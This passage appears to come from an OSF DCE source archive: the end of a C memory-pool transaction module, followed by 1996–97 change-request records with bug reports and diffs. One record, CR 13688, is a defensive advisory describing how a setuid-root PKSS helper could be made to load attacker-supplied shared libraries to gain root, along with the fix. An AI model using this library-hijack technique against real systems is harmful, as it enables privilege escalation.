	cnt = 0;
	for (bp = mp->lqh.cqh_first;
	    bp != (void *)&mp->lqh; bp = bp->q.cqe_next) {
		(void)fprintf(stderr, "%s%d", sep, bp->pgno);
		if (bp->flags & MPOOL_DIRTY)
			(void)fprintf(stderr, "d");
		if (bp->flags & MPOOL_PINNED)
			(void)fprintf(stderr, "P");
		if (++cnt == 10) {
			sep = "\n";
			cnt = 0;
		} else
			sep = ", ";
			
	}
	(void)fprintf(stderr, "\n");

  } MP_UNLOCK(mp);
}
#endif

/* *** G-L-O-R-I-A TXN CHANGES *** BEGIN */
/*
 * mpool_trash_cache -- throw dirty pages in cache away, forcing
 *                      new read of on-disk copy
 * 
 *
 */
static void
mpool_trash_cache(mp) 
    MPOOL *mp;
{
   BKT *bp, *next_bp;

#ifdef DEBUG_TXN
      fprintf(stderr, "Dumping pages from cache: ");
#endif

   for (bp = mp->lqh.cqh_first; bp != (void *)&mp->lqh; 
	bp = next_bp) {

      next_bp = bp->q.cqe_next;

      if (bp->flags & MPOOL_DIRTY) {
#ifdef DEBUG_TXN
	 fprintf(stderr, "%d ", bp->pgno);
#endif 
	 
	 CIRCLEQ_REMOVE(&mp->hqh[HASHKEY(bp->pgno)], bp, hq);
	 CIRCLEQ_REMOVE(&mp->lqh, bp, q);

	 free (bp);
	 --(mp->curcache);
#ifdef STATISTICS
	 --(mp->pagealloc);
#endif
      }
   }
#ifdef DEBUG_TXN
	 fprintf(stderr, ".\n");
#endif 
}

/*
 * mpool_trash_page_table -- trash structures associated with 
 *                           current page table: free_list,
 *                           shadow_list and page_table.
 * Parameters:
 *   MPOOL *mp
 *
 * Returns:
 *   none
 */
static void
mpool_trash_page_table(mp) 
   MPOOL *mp;
{
   FRAME *f,*nextframe;

   /*
    * We don't really need to change much, just 
    * free all the allocated memory, and set some
    * pointers to NULL, and it's as though the 
    * table and lists never existed.
    */
   for (f = mp->free_frames; f != NULL; f = nextframe) {
      nextframe = f->next;
      free (f);
   }
   mp->free_frames = NULL;

   for (f = mp->shadow_frames; f != NULL; f = nextframe) {
      nextframe = f->next;
      free (f);
   }
   mp->shadow_frames = NULL;

   if (mp->page_table) {
       free (mp->page_table);
   }

   mp->max_pages = 0;

#ifdef STATISTICS
   mp->nfree_frames = mp->nshadow_frames = 0;
#endif
}

/*
 * mpool_txn_begin
 *
 * Parameters:
 *   MPOOL *mp
 *
 * Returns:
 *   RET_ERROR, RET_SUCCESS
 */
/*
 * Changed to MACRO per code review.  Stored in MPOOL.H
 *
 * int mpool_txn_begin (mp)
 *     MPOOL *mp;
 * {
 *   mp->rollback_npages = mp->npages;
 * }
 */



/*
 * mpool_txn_commit - commit this txn to the non-volatile database
 *
 * Parameters:
 *   MPOOL *mp
 *
 * Returns:
 *   RET_ERROR, RET_SUCCESS
 */
int mpool_txn_commit (mp)
     MPOOL *mp;
{
   int new_current;
   int table_size;
   FRAME *f,*nextframe;

   /*
    * Check to see if there's no changes to commit
    */
   if (mp->shadow_frames == NULL) {
      return(RET_SUCCESS);
   }

   /*
    * Sync dirty blocks to disk 
    */
   if (mpool_sync (mp) != RET_SUCCESS) {
      return (RET_ERROR);
   }

   /*
    * Write page table to disk file that does not
    * have the current page table
    */
   new_current = mp->current == 0 ? 1 : 0;
   table_size = mp->npages * PAGE_TABLE_ENTRY_SIZE;
   if (lseek (mp->page_table_fd[new_current], 0, SEEK_SET) != 0)
     return (RET_ERROR);
   if (write (mp->page_table_fd[new_current], mp->page_table, table_size) !=
       table_size)
     return (RET_ERROR);
   if (fsync(mp->page_table_fd[new_current]) != RET_SUCCESS)
     return (RET_ERROR);

   /*
    * Tell disk to use the new page table
    */
   if (lseek (mp->fd, 0, SEEK_SET) != 0)
     return (RET_ERROR);
   if (write (mp->fd, &new_current, sizeof(new_current)) != sizeof(new_current))
     return (RET_ERROR);
   if (fsync(mp->fd) != RET_SUCCESS)
     return (RET_ERROR);

   /*
    * Remind ourselves which on disk page table is good too
    */
   mp->current = new_current;

   /*
    * Move shadow frames onto the free frame list 
    */
#ifdef DEBUG_TXN
      fprintf(stderr, "Freeing shadow frames: ");
#endif

   for (f = mp->shadow_frames; f != NULL; f = nextframe) {
      nextframe = f->next;
      f->next = mp->free_frames;
      mp->free_frames = f;
#ifdef STATISTICS
      mp->nfree_frames++;
      mp->nshadow_frames--;
#endif 
#ifdef DEBUG_TXN
      fprintf(stderr, "%d ",f->frame);
#endif
   }
   mp->shadow_frames = NULL;

#ifdef DEBUG_TXN
      fprintf(stderr, ".\n ");
#endif
   
#ifdef STATISTICS
   mp->commit++;
   if (mp->nfree_frames > mp->max_free_frames) 
     mp->max_free_frames = mp->nfree_frames;
#endif 

   return (RET_SUCCESS);
}

/*
 * mpool_txn_rollback (mp) 
 *
 * Parameters:
 *   MPOOL *mp
 * 
 * Returns:
 *   RET_ERROR, RET_SUCCESS
 */
int mpool_txn_rollback (mp)
     MPOOL *mp;
{
   int status;

   /*
    * Dump dirty pages from cache
    */
   mpool_trash_cache (mp); /* always success */
   mp->npages = mp->rollback_npages;

   /*
    * Read in on-disk current page table, this remains current
    *
    * Start over reading the page table in.  This isn't
    * the fastest way to accomplish the task, but it 
    * won't happen often.  We hope.
    */
   mpool_trash_page_table (mp); /* always success */
   status = mpool_load_page_table (mp);

#ifdef STATISTICS
   mp->rollback++;
#endif
   
   return (status);
}
/* *** G-L-O-R-I-A TXN CHANGES *** END */



CR Number                     : 13692
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : rgynbase.idl
Short Description             : sec_rgy_domain_principal does not exist
Reported Date                 : 1/6/97
Found in Baseline             : 1.1
Found Date                    : 1/6/97
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/idl/rgynbase.idl
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[1/6/97 public]
The constant "sec_rgy_domain_principal" referred to in the documentation
does not exist, but sec_rgy_domain_person is what it means.

The following diff to security/idl/rgynbase.idl adds
sec_rgy_domain_principal with the same value as sec_rgy_domain_person (0)
and causes /usr/include/dce/rgybase.h to change to reflect it as well.
Since both constants will now exist it won't break existing code but will
allow end-users (and vendors/providers) to use the
sec_rgy_domain_principal name.

*** security/idl/rgynbase.idl
--- 13.2        1997/01/03 21:28:21
***************
*** 177,182 ****
--- 188,194 ----
      typedef signed32    sec_rgy_domain_t;

      const signed32      sec_rgy_domain_person = 0;
+     const signed32      sec_rgy_domain_principal = 0;
      const signed32      sec_rgy_domain_group = 1;
      const signed32      sec_rgy_domain_org = 2;
      const signed32      sec_rgy_domain_last = 3;



CR Number                     : 13690
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Problem in error path in rpc_ns_import_ctx_add_eval
Reported Date                 : 12/20/96
Found in Baseline             : 1.1
Found Date                    : 12/20/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/20/96 public]

This defect is reported by IBM dcemvs.  Following is their description:


 prefix        d
 name          893
 reference     I18N
 abstract      Problem in error path in rpc_ns_import_ctx_add_eval
 duplicate

 state         closed
 severity      3
 age           0

 compName      rpc_runtime                 answer        program_defect
 release       mvs_r4
 envName
 level

 addDate       95/04/17 09:42:00           assignDate    95/05/01 17:34:28
 lastUpdate    96/07/31 14:41:12           responseDate  96/07/23 16:00:59
 endDate       96/07/31 14:41:12

 ownerLogin    vickip                      originLogin   vickip
 ownerName     Vicki Pritko                originName    Vicki Pritko
 ownerArea     G98                         originArea    G98

 defectOrigin    OSF11

 defectType      05I_algorithm
 defectTrigger   P01_stress
 defectSource    05_imported
 defectImpact    10_capability
 actvtyWhnFound  02_ILLD
 phaseInjected   04_CODE/UT

 aparNumber
 Level 3 Hours

 CA Required?
 CA Performed

 tracks:
     releaseName           state           addDate   lastUpdate target
     --------------------- --------------- --------- ---------- ---------------
     mvs_r4                complete        96/07/23  96/07/31

 verify:
     type            state           addDate   lastUpdate userLogin
     --------------- --------------- --------- ---------- ---------------
     original        accept          96/07/23  96/07/31   vickip

 history:
     addDate              action          userLogin (userName)
     -------------------- --------------- ----------------------------------
     95/04/17 09:42:01    open            vickip (Vicki Pritko)

     95/07/26 11:46:05    modify          vickip (Vicki Pritko)
     96/01/24 10:58:08    modify          tjh (Tim Hahn)
     96/01/24 11:18:06    modify          tjh (Tim Hahn)
     96/06/11 09:45:21    modify          vickip (Vicki Pritko)
     96/07/11 16:13:55    note            vickip (Vicki Pritko)
     96/07/23 16:00:59    accept          vickip (Vicki Pritko)
     96/07/24 14:41:22    note            vickip (Vicki Pritko)
     96/07/24 15:46:09    note            vickip (Vicki Pritko)
     96/07/24 15:47:05    modify          vickip (Vicki Pritko)
     96/07/31 13:54:19    verify          harlan (Doug Harlan)
     96/07/31 14:41:12    close           vickip (Vicki Pritko)

 duplicate defects: none.

 duplicate features: none.

 sizing: none.

 notes:
     <Note by vickip (Vicki Pritko), 95/04/17 09:42:01, action: open>
 In module cs_s_eval.c in function rpc_ns_import_ctx_add_eval,
 if the import function context has already been allocated
 and we successfully allocate a new evaluation list
 structure, but we fail when rpc_rgy_get_codesets is called,
 then the code does not clean up correctly.  Right now the
 code from OSF releases the input import function context.
 By doing this, it is releasing the pointer to the valid
 list of evaluation routines but not releasing any of the
 list.
 Either
 1.  This routine should exit without releasing the import
     function context in the case.  It should be documented
     that the client program should always call
     rpc_ns_binding_import_done to release all of the allocated
     storage.
 or
 2.  When exiting with an error in this case, we should release
     the entire list of evaluation routines and then release
     the import function context.

 Note that this change should also apply to the new RAS being
 added into the same area, when there is a problem allocating
 the new evaluation list structure.


     <Note by vickip (Vicki Pritko), 96/07/11 16:13:55, action: note>
 I looked into this defect a little more and it seems as
 though the error path was copied from a similar error
 path earlier in the code.  In the path that I describe
 above, eval_func_rep has not even been initialized at
 the point when we call RPC_MEM_FREE.  It is initialized
 after the call to rpc_rgy_get_codesets successfully
 completes.  I think that all that needs to be done
 is comment out the RPC_MEM_FREE of eval_func_rep.

     <Note by vickip (Vicki Pritko), 96/07/24 14:41:22, action: note>
 I have commented out the call and unit-tested the update.



CR Number                     : 13689
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Abend during evaluation in rpc_cs_get_tags
Reported Date                 : 12/20/96
Found in Baseline             : 1.1
Found Date                    : 12/20/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cs_s_stub.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/20/96 public]

This defect is reported by IBM MVS DCE.  The following is their description:


prefix        d
name          5248
reference     I18N
abstract      Abend during evaluation in rpc_cs_get_tags
duplicate

state         closed
severity      2
age           0

compName      rpc_runtime                 answer        program_defect
release       mvs_r4
envName
level

addDate       96/07/29 13:31:10           assignDate    96/07/29 13:33:12
lastUpdate    96/08/07 08:47:35           responseDate  96/07/29 13:33:31
endDate       96/08/07 08:47:35

ownerLogin    vickip                      originLogin   vickip
ownerName     Vicki Pritko                originName    Vicki Pritko
ownerArea     G98                         originArea    G98

defectOrigin    OSF11

defectType      04M_assignment
defectTrigger   P06_normal_mode
defectSource    05_imported
defectImpact    10_capability
actvtyWhnFound  03_ICODE
phaseInjected   03_LLD

aparNumber
Level 3 Hours

CA Required?
CA Performed

Target

tracks:
    releaseName           state           addDate   lastUpdate target
    --------------------- --------------- --------- ---------- ---------------
    mvs_r4                complete        96/07/29  96/08/06

verify:
    type            state           addDate   lastUpdate userLogin
    --------------- --------------- --------- ---------- ---------------
    original        accept          96/07/29  96/08/07   vickip

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    96/07/29 13:31:10    open            vickip (Vicki Pritko)
"5248.defect" 121 lines, 4322 characters
    96/07/29 13:33:12    assign          vickip (Vicki Pritko)
    96/07/29 13:33:31    accept          vickip (Vicki Pritko)
    96/07/29 13:39:37    note            vickip (Vicki Pritko)
    96/07/30 08:33:34    note            vickip (Vicki Pritko)
    96/07/30 08:34:11    modify          vickip (Vicki Pritko)
    96/08/06 15:06:55    verify          harlan (Doug Harlan)
    96/08/07 08:47:35    close           vickip (Vicki Pritko)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by vickip (Vicki Pritko), 96/07/29 13:31:10, action: open>
When using rpc_cs_get_tags to do the code set evaluation
(ie. no evaluation routines are called in the client code),
this routine abends.  The client app takes a CEE dump and
then issues the following message:
EUVR01525A The method for processing the binding handle
           conversion information for API cs_byte_net_size
           is not valid.

    <Note by vickip (Vicki Pritko), 96/07/29 13:33:12, action: assign>
Old Owner: regerkk
New Owner: vickip



    <Note by vickip (Vicki Pritko), 96/07/29 13:39:37, action: note>
I have debugged this defect as follows.

The reason the code abends is that rpc_cs_get_tags never sets
the bind_p->cs_eval.key.  Thus when cs_byte_net_size gets
called, the code will fall through to the client path and
check bind_p->cs_eval.key.  If this field is not set, then
the code will take a dump and issue the message stated
above.

The fix for this problem is to set bind_p->cs_eval.key to
RPC_CS_EVAL_TAGS before exiting rpc_cs_get_tags.



CR Number                     : 13688
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : pkss
Short Description             : potential security problem in pkss
Reported Date                 : 12/18/96
Found in Baseline             : 1.2.2b5
Found Date                    : 12/18/96
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/pkc/pkss/pipe/<platform>/pkss_helper.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/18/96 public]

Summary
-------
The PKSS code in R1.2.2BL5 has a security vulnerability that can allow an
attacker to gain root access to the machine.  While the released version of
DCE R1.2.2 does not exhibit this problem on the reference platform, the fix
is specific to AIX, and vendors porting DCE to other platforms should be
aware of this problem so that an appropriate platform-specific solution can
be designed.


Description
-----------
The protocol used to communicate between the PKSS server and DCE's client-side
login code requires that the client authenticate the identity of the PKSS.
This requires the client-side to have access to a DCE login-context before
login has completed.  The PKSS client-side makes use of the machine's
credential to perform this authentication.  This requires that some portion
of the client-side code run with root privileges.  The PKSS client-side is
divided into two parts - a small API layer that is linked with libdce and an
ancillary process which is installed as a setuid-root program.

On platforms supporting shared libraries with user-controllable library
path resolution, this may introduce a security hole into the system.  It is
possible for an attacker to run the ancillary program having configured
the environment such that the libraries that the ancillary program invokes
(which include libdce and the C++ runtime) are replaced with the attacker's 
own libraries, which will then be invoked with root privileges.

Solution
--------
The final release version of DCE includes a fix for this problem.  This fix
is specific to the reference platform, but can be used as a template for
other platforms for which this problem exists.

The ancillary process has been split into two files: pkss_helper and
pkss_helper2.  pkss_helper2 contains all the code of the original ancilliary
process, but is not installed as a setuid file.  pkss_helper is a setuid-root
program whose sole purpose is to establish a secure environment in which
to exec pkss_helper2.  pkss_helper is linked against only static libraries
so that it does not suffer from this problem itself.

On AIX, establishing a secure environment in accomplished by setting the
LIBPATH environment variable to an empty string, telling the AIX loader
to search only the default directories when attempting to resolve references
to shared libraries.  While a similar approach is expected to work on other
Unix platforms, the details are likely to vary between platforms.

The source code for the pkss_helper program has therefore been placed in an
AIX-specific subdirectory (src/security/pkc/pkss/pipe/RIOS/pkss_helper.c).
This file may be used as an example for porting.  For platforms where this
attack is possible, it is important that pkss_helper is built using only
static libraries.



CR Number                     : 13686
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : libdce u2u
Short Description             : Overzealous mem leak fix broke use of u2u by RPC runtime
Reported Date                 : 12/18/96
Found in Baseline             : 1.2.2
Found Date                    : 12/18/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/utils/sec_authn.c
Diff supplied by              : provider
Diff release                  : 1.2.2
Sensitivity                   : public

[12/18/96 public]
A recent overzealous memory leak fix to sec_authn.c freed too much data.
This was not picked up by the automatic kerberos user to user test because
it did not rely on the routine changed.  The manual test picked it up a
couple days ago and I proved that it was broken yesterday afternoon.  The
fix must be applied to 1.2.2 GA by licensees in order for full use of the
user to user protocol in DCE products (eg, use via auth-RPC instead of just
by Kerberos).  The fix listed below has been tested and has fixed the problem,
and has been reviewed and verified that it does not re-open the memory leak
that the previous fix intended to plug, or any new memory leaks.  The fix
really is a simple as the diff looks (remove the if block that free()s the
second ticket data, which is necessary for correct operation of the
following call krb5_get_credentials_dce())

I'll take responsibility for this going unnoticed, as I'm the one that's
been complaining for years about manual tests, and I didn't put this work
item on the plate for 1.2.2 (mistaken assumption that the existing automatic
u2u test was testing more of the code path, and that we would have run this
manual test enough to notice the regression).  I'm opening up a related
OT (RPC enhancement OT for the RPC runtime "perf" test which has always been
a manual test) for this test to become automated (TETified) in the next
release.

*** sec_authn.c@@/main/DCE_1.2.2/mb_u2u3/0      Wed Dec 18 11:20:14 1996
--- sec_authn.c Wed Dec 18 11:22:19 1996
***************
*** 1065,1083 ****
                           * Kerberos does not expect a fully populated kcred
                           * structure, so free what we don't need.
                           */
                          if (kcred->ticket.data) {
                              xfree(kcred->ticket.data);
                              kcred->ticket.data = NULL;
                          }
-                         if (kcred->second_ticket.data) {
-                             xfree(kcred->second_ticket.data);
-                             kcred->second_ticket.data = NULL;
-                         }
- 
  
                          st = krb5_get_credentials_dce(options,
                                          krb_ccache, kcred, tgt_authdata);
                          /* CHFts16434: if we get an error here, it means the
                           * PTGT just expired.  Release any epac data, then loop
                           * again, which will get a fresh PTGT this time
                           */



CR Number                     : 13685
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : gssapi
Short Description             : interoperate with krb5 mechanism
Reported Date                 : 12/17/96
Found in Baseline             : 1.1
Found Date                    : 12/17/96
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/17/96 public]

This is from some email by the GSSAPI engineer:

The DCE GSSAPI implements two mechanisms - DCE and "name-based" security.  The
protocol used for the latter mechanism was the basis for the original IETF
Kerberos GSSAPI Internet Draft.  Since then there have been a couple revisions
to the ID, and now it's made its way to RFC status.

We never fully tested interoperability with any MIT Kerberos implementation of
the protocol, since at the time DCE R1.1 froze, the MIT implementation didn't
fully meet the ID spec (because of an endian-ness bug).  We haven't tested
subsequent releases of the MIT implementation, although now that the spec has
become an RFC it's probably time to do this and officially support
interoperation (once the underlying DCE Kerberos implementation is fully
interoperable, as of R1.2.2).

One "happy accident" of the ID-RFC process is that the OID used to indicate
"GSSAPI over Kerberos" changed during the standardization process.  The DCE
implementation treats either the original OID or the new OID as equivalent on
receipt (and tries to interpret the packet accdording to the original
protocol), but always generates the original OID value in emitted packets.  It
would be simple to add support for a third mechanism (MIT Kerberos), and retain
the current behavior for packets using the original OID, thus retaining
backwards compatibility across DCE versions as well as achieving interoperation
with MIT.



CR Number                     : 13684
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : krb5 interop
Short Description             : Reservation of sec_login flags, new error code for krb5 ticket requests
Reported Date                 : 12/16/96
Found in Baseline             : 1.2.1
Found Date                    : 12/16/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : sec_login.h, sec.sams
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/16/96 public]

We would like to reserve the following sec_login_flag_t values
and error code for future KRB5/DCE interoperability support.
This change is being logged in advance to prevent interoperability/API 
compatibility problems between DCE releases.

sec_login.h:

      /*
       * login context with forwardable flag on
       */
      const unsigned32    sec_login_forwardable_tkt   = 0x40;
 
      /*
       * login context with renewable flag on - not implemented yet
       */
      const unsigned32    sec_login_renewable_tkt     = 0x80;
 
      /*
       * login context with proxiable flag on - not implemented yet
       */
      const unsigned32    sec_login_proxiable_tkt     = 0x100;

sec.sams:

>< start   undocumented
>< code    sec_login_s_PADe
>< text    "sec_login_s_PADe"
>< explanation    "?"
>---
>> start   
>> code    sec_login_s_flag_not_support
>> text    "Specified flag is not yet implemented in this version of DCE."
>> explanation    "Do not use this flag."



CR Number                     : 13683
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : sams
Short Description             : sams generates duplicate SGML field
Reported Date                 : 12/14/96
Found in Baseline             : 1.2.2
Found Date                    : 12/14/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/14/96 public]

Where a sams file contains a sub-component field, the generated
SGML will contain duplicate <MsgOrig> field, one with the Compon-
ent alone, the other with both the Component and Sub-component.
Only the second should be there.



CR Number                     : 13681
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : file/security/dacl
Short Description             : global groups broken by bad realm info
Reported Date                 : 12/12/96
Found in Baseline             : 1.2.2
Found Date                    : 12/12/96
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : file/security/dacl/dacl_access.c
Diff supplied by              : provider
Diff release                  : 1.2
Sensitivity                   : public
-offected File(s)             : 

[12/12/96 public]


During testing we found that a global group was not recognised by
DFS server because realm info was incorrect. We have corrected the
realm info and global groups now work OK in DFS. Here are the diffs:


39c39
< RCSID("$Header: /project/ot/dce/d01/d36/RCS/c013681,v 1.1 96/12/12 11:32:13 root Exp $")
---
> RCSID("$Header: /project/ot/dce/d01/d36/RCS/c013681,v 1.1 96/12/12 11:32:13 root Exp $")
178,179c178
< PRIVATE dacl_entry_t * dacl_FindMatchingListEntry(userIdP, groupIdP, 
<                                                 realmIdP, inDefaultRealm, 
---
> PRIVATE dacl_entry_t * dacl_FindMatchingListEntry(userIdP, groupIdP, realmIdP,
184d182
<      int                      inDefaultRealm;
258,259c256,258
<       if (inDefaultRealm && (userIdP != (epi_uuid_t *)NULL) &&
<           (Epi_PrinId_Cmp(userIdP, &(thisEntryP->entry_info.id)) == 0)) { 
---
>       if ((userIdP != (epi_uuid_t *)NULL) &&
>           (Epi_PrinId_Cmp(userIdP, &(thisEntryP->entry_info.id)) == 0) &&      
>           (realmIdP == (epi_uuid_t *)NULL)) {          
282,284c281,284
<       if (inDefaultRealm && (groupIdP != (epi_uuid_t *)NULL) &&        
<           (Epi_PrinId_Cmp(groupIdP, &(thisEntryP->entry_info.id)) == 0)) {
<           rtnVal = thisEntryP;
---
>       if ((groupIdP != (epi_uuid_t *)NULL) &&          
>           (Epi_PrinId_Cmp(groupIdP, &(thisEntryP->entry_info.id)) == 0) &&     
>           (realmIdP == (epi_uuid_t *)NULL)) {          
>         rtnVal = thisEntryP;
305c305,306
<       if ((realmIdP != (epi_uuid_t *)NULL) &&
---
>       
>       if ((realmIdP != (epi_uuid_t *)NULL) &&          
330a332
>           
434a437
>     epi_uuid_t zeroUuid;
435a439
> 
487,490d490
<     uuid_t foreignGrpRealm;   /* Realm of a foreign group */
<     int foreignGrpIsLocal = 0;        /* Is the foreign group's realm same as the
<                                * default realm of the ACL? */
< 
494a495
>     uuid_t RealmUUID;
519a521,522
>         /* just make the following comparison once */
>         bzero((char *)&zeroUuid, sizeof(epi_uuid_t));
521a525,534
>                           /* This clause should only be necessary
>                            * for operation of completely
>                            * stand-alone Episode. Otherwise, we
>                            * should have a real uuid for the local
>                            * realm to have been used by the
>                            * operation that makes pacs from struct
>                            * ucreds.  
>                            */
>                           (bcmp((char *)realmIdP, (char *)&zeroUuid, 
>                                 sizeof(epi_uuid_t)) == 0) ||
613c626
<                                                     realmIdP, realmIsDefault,
---
>                                                     (realmIsDefault) ? (epi_uuid_t *)NULL : realmIdP,
623c636
<                                                realmIdP, realmIsDefault,
---
>                                                ((realmIsDefault) ? (epi_uuid_t *)NULL : realmIdP),
661c674
<                                                    realmIdP, realmIsDefault,
---
>                                                    (realmIsDefault) ? (epi_uuid_t *)NULL : realmIdP,
675,676c688
<                                                        realmIdP, 
<                                                        realmIsDefault,---
>                                                        (realmIsDefault) ? (epi_uuid_t *)NULL : realmIdP, 
722c734
<                                                    realmIdP, realmIsDefault,
---
>                                                    (realmIsDefault) ? (epi_uuid_t *)NULL : realmIdP,
738,739c750
<                                                        realmIdP, 
<                                                        realmIsDefault,---
>                                                        (realmIsDefault) ? (epi_uuid_t *)NULL : realmIdP,
756,760c767
< 
<                     foreignGrpRealm = foreignGroupSetP[j].realm.uuid;
<                     foreignGrpIsLocal = (bcmp((char *)&foreignGrpRealm, 
<                                               (char *)&(aclP->default_realm),
<                                               sizeof(epi_uuid_t)) == 0);
---
>                     RealmUUID = foreignGroupSetP[j].realm.uuid;
767,774d773
< #if !defined(DACL_EPISODE)
<                         foreignGrpRealm = 
<                             *(uuid_t *)(&(foreignGroupIdListP[i].realm.uuid));
<                         foreignGrpIsLocal = 
<                             (bcmp((char *)&foreignGrpRealm, 
<                                   (char *)&(aclP->default_realm),
<                                   sizeof(epi_uuid_t)) == 0);
< #endif
776a776
> 
778a779
>                                                        &RealmUUID,
780a782
>                                                        &(foreignGroupIdListP[i].realm.uuid),
782,783d783
<                                                        &foreignGrpRealm,
<                                                        foreignGrpIsLocal,
798,799c798
<                                                            &foreignGrpRealm,
<                                                            foreignGrpIsLocal,
---
>                                                            &RealmUUID,824c823
<                                                    realmIdP, realmIsDefault,
---
>                                                    realmIdP,
831,832c830
<                                                        realmIdP, 
<                                                        realmIsDefault,---
>                                                        realmIdP,



CR Number                     : 13680
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : 
Short Description             : TARGET_SYS should be TARGET_MACHINE
Reported Date                 : 12/9/96
Found in Baseline             : 1.2.2
Found Date                    : 12/9/96
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/9/96 public]

There are a few Makefiles that should have TARGET_SYS changed to TARGET_MACHINE:

test/file/cmmhs/RIOS/Makefile
file/bosserver/Makefile



CR Number                     : 13679
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : 
Short Description             : Problem with abs path in a Makefile
Reported Date                 : 12/6/96
Found in Baseline             : 1.2.2
Found Date                    : 12/6/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/6/96 public]

My suggestion would be to change the file as Sean suggests at the end of this
entry, since we are shipping with rc files that use absolute paths, and make
a note in the release notes.

From Sean:
 If you look at src/test/functional/security/lib/Makefile:

.if ${TARGET_MACHINE} == "RIOS"
# If OBJECTDIR is a relative path
VPATH           = ${SOURCEBASE}/${OBJECTDIR}/admin/expect_dce
.else
# If OBJECTDIR is an absolute path
VPATH           = ${OBJECTDIR}/admin/expect_dce
.endif

For some reason, OBJECTDIR was a relative path on our RIOS platform here
at HP and we had to define VPATH this way in order to pick up the expect
binary.  On your system, OBJECTDIR is not relative, so you want to use
the VPATH in the else part of the statement above.

For now, I would just remove the entire [.if/.else/.endif] block
and replace it with:

VPATH           = ${OBJECTDIR}/admin/expect_dce

This will get you past the build problem but is not the correct fix
because it doesn't handle relative pathnames for OBJECTDIR.



CR Number                     : 13678
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : dcecf
Short Description             : dcecf/cfg.sams hardcodes error values
Reported Date                 : 12/5/96
Found in Baseline             : 1.1
Found Date                    : 12/5/96
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : dce/utils/dcecf/cfg.sams
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/5/96 public]

The cfg.sams file hard codes error values for all of its
